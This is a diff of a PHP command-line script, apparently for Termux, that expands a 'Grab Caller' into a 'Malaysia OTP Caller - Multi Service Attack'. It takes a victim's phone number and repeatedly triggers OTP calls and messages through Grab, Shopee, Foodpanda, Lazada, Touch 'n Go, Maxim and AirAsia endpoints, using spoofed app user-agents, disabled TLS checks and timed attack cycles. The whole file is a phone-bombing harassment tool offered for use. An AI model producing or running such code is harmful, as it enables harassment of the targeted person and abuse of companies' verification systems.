@@ -1,13 +1,13 @@
 <?php
 
-class GrabCaller {
+class MalaysiaCaller {
     private $number;
     
-    private function correct($number) {
-        // Clean the number
+    private function formatNumber($number) {
+        // Clean number
         $number = preg_replace('/[^0-9]/', '', $number);
         
-        // Convert Malaysian format - 011 numbers are 10-11 digits
+        // Format to 60XXXXXXXXX
         if (substr($number, 0, 2) == "60") {
             return $number;
         } elseif (substr($number, 0, 1) == "0") {
@@ -17,109 +17,9 @@ class GrabCaller {
         }
     }
     
-    private function randStr($length) {
-        $characters = '0123456789abcdef';
-        $randStr = '';
-        for ($i = 0; $i < $length; $i++) {
-            $randStr .= $characters[rand(0, strlen($characters) - 1)];
-        }
-        return $randStr;
-    }
-    
-    private function loop($many, $sleep = null) {
-        $a = 0;
-        $no = $this->correct($this->number);
-        $success = 0;
-        $failed = 0;
-        
-        echo "[+] Target: $no\n";
-        echo "[+] Total calls: $many\n";
-        echo "[+] Starting attack...\n\n";
-        
-        while ($a < $many) {
-            $rand = rand(123456, 9999999);
-            $rands = $this->randStr(12);
-            
-            // Fix: Use correct country code and phone number format
-            $post = "method=CALL&countryCode=my&phoneNumber=" . urlencode($no) . "&templateID=pax_android_production&channel=whatsapp";
-            
-            $h = array();
-            $h[] = "x-request-id: ebf61bc3-8092-4924-bf45-$rands";
-            $h[] = "Accept-Language: ms-MY;q=1.0, en-us;q=0.9, en;q=0.8";
-            $h[] = "User-Agent: Grab/5.20.0 (Android 6.0.1; Build $rand)";
-            $h[] = "Content-Type: application/x-www-form-urlencoded";
-            $h[] = "Host: api.grab.com";
-            $h[] = "Connection: close";
-            
-            $ch = curl_init();
-            curl_setopt($ch, CURLOPT_URL, "https://api.grab.com/grabid/v1/phone/otp");
-            curl_setopt($ch, CURLOPT_POST, 1);
-            curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
-            curl_setopt($ch, CURLOPT_HTTPHEADER, $h);
-            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
-            curl_setopt($ch, CURLOPT_TIMEOUT, 30);
-            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-            curl_setopt($ch, CURLOPT_HEADER, false);
-            
-            $response = curl_exec($ch);
-            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-            $error = curl_error($ch);
-            
-            // Remove curl_close for PHP 8.0+
-            if (version_compare(PHP_VERSION, '8.0.0', '<')) {
-                curl_close($ch);
-            }
-            
-            $a++;
-            
-            // Check response
-            if ($httpCode == 200 || $httpCode == 204) {
-                $success++;
-                echo "[$a/$many] ✅ Call sent successfully\n";
-            } elseif ($httpCode == 400) {
-                $failed++;
-                echo "[$a/$many] ❌ Failed - Invalid number format (HTTP: $httpCode)\n";
-                // Try alternate format
-                $this->tryAlternateFormat($no);
-                break;
-            } elseif ($httpCode == 429) {
-                $failed++;
-                echo "[$a/$many] ⚠️ Rate limited (HTTP: $httpCode) - Waiting longer...\n";
-                sleep(60);
-            } else {
-                $failed++;
-                echo "[$a/$many] ❌ Failed (HTTP: $httpCode)\n";
-                if ($error) {
-                    echo "    Error: $error\n";
-                }
-                if ($response) {
-                    echo "    Response: $response\n";
-                }
-            }
-            
-            if ($sleep !== null && $a < $many) {
-                sleep($sleep);
-            }
-            
-            if ($sleep === null && $a < $many) {
-                sleep(rand(3, 7));
-            }
-        }
-        
-        echo "\n[+] ========== FINISHED ==========\n";
-        echo "[+] Total: $many\n";
-        echo "[+] Successful: $success\n";
-        echo "[+] Failed: $failed\n";
-        echo "[+] ===============================\n";
-    }
-    
-    private function tryAlternateFormat($no) {
-        echo "[*] Trying alternative format...\n";
-        
-        // Try with different template ID
-        $post = "method=CALL&countryCode=my&phoneNumber=" . urlencode($no) . "&templateID=grab_otp_production";
+    private function grabCall($no) {
+        $rand = rand(100000, 999999);
+        $post = "method=CALL&countryCode=my&phoneNumber=" . urlencode($no) . "&templateID=pax_android_production";
         
         $ch = curl_init();
         curl_setopt($ch, CURLOPT_URL, "https://api.grab.com/grabid/v1/phone/otp");
@@ -128,92 +28,293 @@ class GrabCaller {
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
         curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
         curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
-        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 20);
+        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+            "User-Agent: Grab/5.20.0 (Android 6.0.1; Build $rand)",
+            "Content-Type: application/x-www-form-urlencoded",
+            "X-Request-ID: " . uniqid(),
+        ));
         
         $response = curl_exec($ch);
         $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
         
-        if ($httpCode == 200 || $httpCode == 204) {
-            echo "[+] ✅ Alternative format worked!\n";
-        } else {
-            echo "[-] ❌ Alternative format also failed\n";
-        }
+        return $httpCode == 200 || $httpCode == 204;
+    }
+    
+    private function shopeeCall($no) {
+        $url = "https://shopee.com.my/api/v1/otp/request";
+        $post = "phone=" . urlencode($no) . "&country_code=60";
         
-        if (version_compare(PHP_VERSION, '8.0.0', '<')) {
-            curl_close($ch);
-        }
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 20);
+        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+            "User-Agent: Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36",
+            "Content-Type: application/x-www-form-urlencoded",
+            "Referer: https://shopee.com.my",
+        ));
+        
+        $response = curl_exec($ch);
+        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
+        
+        return $httpCode == 200;
+    }
+    
+    private function foodpandaCall($no) {
+        $url = "https://api.foodpanda.my/v1/otp/send";
+        $post = json_encode(array(
+            "phone_number" => $no,
+            "country_code" => "MY"
+        ));
+        
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 20);
+        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+            "User-Agent: FoodPanda/4.6.0 (Android 11)",
+            "Content-Type: application/json",
+            "Accept: application/json",
+        ));
+        
+        $response = curl_exec($ch);
+        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
+        
+        return $httpCode == 200;
+    }
+    
+    private function lazadaCall($no) {
+        $url = "https://my.lazada.com/api/rest/sms/sendOtp";
+        $post = "mobile=" . urlencode($no) . "&countryCode=60&type=1";
+        
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 20);
+        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+            "User-Agent: Lazada/6.0.0 (Android 11)",
+            "Content-Type: application/x-www-form-urlencoded",
+        ));
+        
+        $response = curl_exec($ch);
+        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
+        
+        return $httpCode == 200;
+    }
+    
+    private function tngCall($no) {
+        // Touch 'n Go eWallet
+        $url = "https://api.tngdigital.com.my/otp/request";
+        $post = json_encode(array(
+            "phoneNumber" => $no,
+            "channel" => "call"
+        ));
+        
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 20);
+        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+            "User-Agent: TNG/eWallet/2.5.0 (Android 11)",
+            "Content-Type: application/json",
+            "Accept: application/json",
+        ));
+        
+        $response = curl_exec($ch);
+        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
+        
+        return $httpCode == 200;
+    }
+    
+    private function maximCall($no) {
+        // Maxim Malaysia (similar to Grab)
+        $url = "https://api.my.maxim.com/v1/verify/send";
+        $post = json_encode(array(
+            "phone" => $no,
+            "country_code" => "60"
+        ));
+        
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 20);
+        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+            "User-Agent: Maxim/2.8.0 (Android 11)",
+            "Content-Type: application/json",
+        ));
+        
+        $response = curl_exec($ch);
+        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
+        
+        return $httpCode == 200;
+    }
+    
+    private function airasiaCall($no) {
+        $url = "https://api.airasia.com/v1/otp/send";
+        $post = json_encode(array(
+            "phoneNumber" => $no,
+            "countryCode" => "60"
+        ));
+        
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 20);
+        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+            "User-Agent: airasia/2.0.0 (Android 11)",
+            "Content-Type: application/json",
+        ));
+        
+        $response = curl_exec($ch);
+        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
+        
+        return $httpCode == 200;
     }
     
     public function run() {
-        echo "\n╔════════════════════════════════╗\n";
-        echo "║     GRAB CALLER - MALAYSIA     ║\n";
-        echo "║        Termux Version          ║\n";
-        echo "╚════════════════════════════════╝\n\n";
+        system('clear');
+        
+        echo "\n╔══════════════════════════════════════╗\n";
+        echo "║     MALAYSIA OTP CALLER - v2.0       ║\n";
+        echo "║        Multi Service Attack          ║\n";
+        echo "╚══════════════════════════════════════╝\n\n";
+        
+        echo "[!] Supported numbers: 012, 013, 014, 016, 017, 018, 019\n";
+        echo "[!] 011 numbers have limited support\n\n";
         
         // Get phone number
         while (true) {
-            echo "Enter Malaysian number (e.g., 0123456789 or +60123456789): ";
+            echo "Enter Malaysian number: ";
             $input = trim(fgets(STDIN));
-            
             $clean = preg_replace('/[^0-9]/', '', $input);
             
             if (strlen($clean) >= 9 && strlen($clean) <= 12) {
-                $this->number = $clean;
+                $this->number = $this->formatNumber($clean);
                 break;
             } else {
-                echo "❌ Invalid number! Please enter a valid Malaysian number.\n\n";
+                echo "❌ Invalid number!\n\n";
             }
         }
         
-        // Get number of calls
+        // Get number of cycles
         while (true) {
-            echo "How many calls? (Max: 20): ";
-            $many = trim(fgets(STDIN));
+            echo "How many attack cycles? (1-10): ";
+            $cycles = trim(fgets(STDIN));
             
-            if (is_numeric($many) && $many > 0 && $many <= 20) {
+            if (is_numeric($cycles) && $cycles > 0 && $cycles <= 10) {
                 break;
             } else {
-                echo "❌ Please enter a number between 1-20\n";
+                echo "❌ Enter 1-10\n";
             }
         }
         
-        // Optional delay
-        echo "Add delay between calls? (0 = random delay, or seconds): ";
-        $sleep = trim(fgets(STDIN));
+        echo "\n[+] Target: {$this->number}\n";
+        echo "[+] Attack cycles: $cycles\n";
+        echo "[+] Starting multi-service attack...\n\n";
         
-        echo "\n[!] Note: This service may not work if Grab has changed their API\n";
-        echo "[!] 011 numbers sometimes don't work with Grab OTP\n";
-        echo "[!] Try with 012, 013, 014, 016, 017, 018, 019 numbers\n\n";
+        $services = [
+            'Grab' => 'grabCall',
+            'Shopee' => 'shopeeCall',
+            'Foodpanda' => 'foodpandaCall',
+            'Lazada' => 'lazadaCall',
+            'Touch n Go' => 'tngCall',
+            'Maxim' => 'maximCall',
+            'AirAsia' => 'airasiaCall'
+        ];
         
-        sleep(2);
+        $totalSuccess = 0;
+        $totalFailed = 0;
         
-        if (is_numeric($sleep) && $sleep > 0) {
-            $this->loop($many, $sleep);
-        } else {
-            $this->loop($many);
+        for ($cycle = 1; $cycle <= $cycles; $cycle++) {
+            echo "══════════════════════════════════════\n";
+            echo "CYCLE $cycle of $cycles\n";
+            echo "══════════════════════════════════════\n";
+            
+            $cycleSuccess = 0;
+            $cycleFailed = 0;
+            
+            foreach ($services as $name => $method) {
+                echo "[*] Calling via $name... ";
+                
+                if ($this->$method($this->number)) {
+                    echo "✅ SUCCESS\n";
+                    $cycleSuccess++;
+                    $totalSuccess++;
+                } else {
+                    echo "❌ FAILED\n";
+                    $cycleFailed++;
+                    $totalFailed++;
+                }
+                
+                sleep(rand(3, 6));
+            }
+            
+            echo "\n[+] Cycle $cycle results: ✅ $cycleSuccess | ❌ $cycleFailed\n\n";
+            
+            if ($cycle < $cycles) {
+                echo "[*] Waiting 60 seconds before next cycle...\n";
+                sleep(60);
+            }
         }
+        
+        echo "\n══════════════════════════════════════\n";
+        echo "FINAL RESULTS\n";
+        echo "══════════════════════════════════════\n";
+        echo "Total Cycles: $cycles\n";
+        echo "Total Successful: $totalSuccess\n";
+        echo "Total Failed: $totalFailed\n";
+        echo "Success Rate: " . round(($totalSuccess / ($totalSuccess + $totalFailed)) * 100, 2) . "%\n";
+        echo "══════════════════════════════════════\n\n";
     }
 }
 
-// Clear screen
-system('clear');
-
-// Check PHP version
-echo "PHP Version: " . phpversion() . "\n";
-
-// Check curl
+// Check PHP extensions
 if (!function_exists('curl_init')) {
-    echo "❌ PHP CURL is not installed!\n";
-    echo "Install it with: pkg install php-curl\n";
-    exit;
+    die("❌ Install PHP CURL: pkg install php-curl\n");
 }
 
-echo "✅ CURL is installed\n\n";
+if (!function_exists('json_encode')) {
+    die("❌ Install PHP JSON: pkg install php-json\n");
+}
 
 // Run
 try {
-    $caller = new GrabCaller();
+    $caller = new MalaysiaCaller();
     $caller->run();
 } catch (Exception $e) {
     echo "❌ Error: " . $e->getMessage() . "\n";
 }
+
+?>
